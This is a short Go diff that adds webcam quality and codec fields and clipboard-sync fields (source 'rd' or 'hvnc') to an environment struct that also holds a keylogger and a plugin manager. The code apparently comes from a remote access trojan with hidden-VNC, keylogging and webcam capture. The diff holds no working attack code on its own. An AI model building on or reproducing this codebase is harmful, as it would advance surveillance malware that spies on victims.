@@ -14,6 +14,7 @@ import (
 )
 
 type Env struct {
+	LastPongUnixMs     int64
 	Conn               wire.Writer
 	Cfg                config.Config
 	Cancel             context.CancelFunc
@@ -37,9 +38,15 @@ type Env struct {
 	WebcamDeviceIndex   int
 	WebcamFPS           int
 	WebcamUseMaxFPS     bool
+	WebcamQuality       int
+	WebcamCodec         string
 	WebcamCancel        context.CancelFunc
 	WebcamDone          chan struct{}
 	WebcamMu            sync.Mutex
+	ClipboardSyncCancel context.CancelFunc
+	ClipboardSyncDone   chan struct{}
+	ClipboardSyncMu     sync.Mutex
+	ClipboardSyncSource string // "rd" or "hvnc"
 	// Other fields
 	Plugins                   *plugins.Manager
 	Keylogger                 *keylogger.Keylogger
@@ -47,7 +54,6 @@ type Env struct {
 	NotificationKeywords      []string
 	NotificationMinIntervalMs int
 	NotificationClipboard     bool
-	LastPongUnixMs            int64
 }
 
 func (e *Env) SetNotificationConfig(keywords []string, minIntervalMs int, clipboardEnabled bool) {
